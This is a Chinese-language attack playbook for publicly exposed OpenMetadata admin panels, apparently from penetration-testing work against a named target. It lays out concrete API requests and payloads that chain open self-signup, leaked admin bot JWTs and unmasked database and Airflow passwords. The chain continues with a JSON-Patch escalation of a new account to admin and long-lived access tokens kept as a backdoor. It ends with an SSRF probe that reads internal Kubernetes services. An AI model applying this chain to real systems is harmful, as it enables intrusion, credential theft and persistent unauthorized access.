# OpenMetadata 管理面实战（1.x；betmaster 案例验证于 1.12.8，覆盖多轮深挖）

目标形态：`openmetadata.<corp>` 暴露公网（常在管理子域群中发现）。除标注外，本流程均在 1.12.8 上实测通过。

## 0. 指纹与版本
- 页面/标题含 `OpenMetadata`；`GET /api/v1/system/version` → `{"version":"1.12.8",...}`（**版本先行**：老版本有公开 CVE，先读版本再决定路线）。
- 存活：`/api/v1/system/health-check`。
- `GET /swagger.json`（或 openapi.json）常可直接下载 → 全量端点离线查参数（本案例 1028 个），比盲试快一个量级。

## 1. 门禁探测（未鉴权可读）
- `GET /api/v1/system/config/auth` → `provider`、`enableSelfSignup`、authority 等。
- `GET /api/v1/system/config/authorizer` → `adminPrincipals`、`principalDomain`、`allowedEmailRegistrationDomains`。
- 判定：`enableSelfSignup=true` 且白名单空 → **任意邮箱可自注册**（零门槛账号）。

## 2. 自注册 → 登录（实测）
- `POST /api/v1/users/signup {"firstName","lastName","email","password"}` → 201；新账号默认 DataConsumer。
- `POST /api/v1/users/login {"email","password"}` —— **password 必须 Base64 编码**；明文 400（`Password needs to be encoded in Base-64.`）。登录 400 先查这里。
- 响应给 accessToken + refreshToken；后续 `Authorization: Bearer <token>`，约 1h 过期，长跑要重登。
- 登录连续错会锁登录层（Failed Login Attempts Exceeded）——锁了别硬锤：提权 / PAT / bot 令牌都不依赖登录成功，走 §4。

## 3. 读面（角色决定 mask）
- `GET /api/v1/services/databaseServices?limit=100` → connection.config 含 hostPort / username / catalog：实测泄露内网 Vault 地址、Snowflake 账号、MySQL 地址。
- `GET /api/v1/services/pipelineServices?limit=100` → Airflow hostPort + authConfig（username=admin、password=mask）→ 拿内部 Airflow 域名。
- `GET /api/v1/apps` → **本案例最大单点泄露：7 个完整 bot JWT（约 800 字符）**。若见截断形态（`eyJraW...Wxsf`），用单实体 GET（`/api/v1/apps/{name}`）或 fields 参数取全量。拿到即解 JWT 看角色（`mcpapplicationbot` 带 ApplicationBotImpersonationRole = isAdmin），Bearer 重放直接用——比走登录快捷得多。
- 其它读面：`/api/v1/bots`、`/api/v1/users`、`/api/v1/tables`、`/api/v1/queries`、`/api/v1/search/query?q=*`、`/api/v1/lineage`。
- `POST /api/v1/services/databaseServices/testConnection`（连接测试；也可当凭据验证/SSRF 探测用，先看权限）。
- **mask 是角色行为，不是数据属性**：DataConsumer 看到的 password 是 `*********`；**admin（含 isAdmin bot 令牌）读单实体时 password 不再 mask——本案例读到 Snowflake / Airflow 连接口令明文**。拿 admin 令牌第一件事：重拉全部 services 连接详情。

## 4. 提权与令牌（本案例全链验证）
1. **bot JWT 直用（最短路径）**：apps 泄露的 isAdmin bot 令牌可读任意用户 PAT、全部未 mask 连接串。局限：bot 身份不能给自己签 PAT。
2. **人类号提权**：自注册号 → `PATCH /api/v1/users/{id}` 置 `isAdmin=true`。**内容类型必须是 `application/json-patch+json`**（普通 application/json 直接失败）；body 用 JSON Patch 语义（字段已存在用 replace，否则 add）。本案例 PATCH 后注册号即 isAdmin=True。（同理可试 JSON-Patch 加 roles——未逐条验证。）
3. **签 PAT**：`PUT /api/v1/users/security/token` —— **bot 身份被拒（"Bots cannot have a Personal Access Token."）**，用提权后的人类号签。字段名 `JWTTokenExpiry` **大小写敏感**（小写 400 `[query param jWTTokenExpiry must not be null]`）。长时/永久 PAT = 稳定后门。
4. 默认管理员口令一发（principalDomain 邮箱）。老版本 CVE（≤1.2.x：JWT 校验绕过 / SpEL RCE，CVE-2024-28255、CVE-2024-28847/28848）——1.12.x 已修，别空锤；本案例 1.12.8 的 SpEL payload 被校验直接拦。

## 5. testDestination SSRF 内网探针（验证）
- 事件/告警订阅的「投递测试」端点 `testDestination`（路由在 events/subscriptions 组下，用实例 swagger.json 定位）会**服务端主动请求你给的 URL**，等于一个内网 HTTP 探针。
- payload 形态：`{"destinations":[{"category":"External","type":"Webhook","config":{"endpoint":"http://<目标>/"}}]}`。
- 回显分级：至少给**内网服务状态码 + 响应头**；本案例进一步确认**响应体回显在返回的 `entity` 字段** → 能读到内网服务的真实返回内容。
- **黑白名单**：字面 `localhost` / `127.0.0.1` / `169.254.x` 被拦；**内部 DNS 名放行**：`<svc>.<ns>.svc.cluster.local`、`*.vpn.svc`（k8s 服务名）畅通 → 用 DNS 名绕过字面 IP 黑名单。
- 实战验证：探到内网 ClickHouse HTTP（`link-main-databases.vpn.svc:8123`）→ 返回 `24.12` 版本 banner + 认证失败信息 = 可达性/版本/用户线索三合一；同法可枚举 `*.svc` 服务名做内网资产发现。
- **升级为协议交互**：内网目标是 HTTP 服务时，探针可直接带业务参数（ClickHouse :8123 支持 `?query=...`；本案例其 URL 形态 `http://<host>:8123/?query=` 来自上游变量明文）。凭据侧（user/db 明文、口令 mask）从上游变量与事件日志挖（见 airflow.md §2–3），别对服务盲爆。

## Pitfalls
- 密码 mask ≠ 没料：host / 端口 / 用户名 / 内网主机名不 mask；且 admin 身份下连密码也不 mask。
- 本案例 `GET /api/v1/queries` 返 500（版本 bug），换 search API 绕。
- 测试遗迹 vs 真实资产：共享靶场里常见前几轮测试者留下的账号/变量（`i24xxx`、`pt*` 系列）——判读时区分，别把别人的测试残留当业务事实写进报告。
- 注册账号 = 留痕：记时间/账号/来源 IP 作 finding 证据；不碰业务数据。
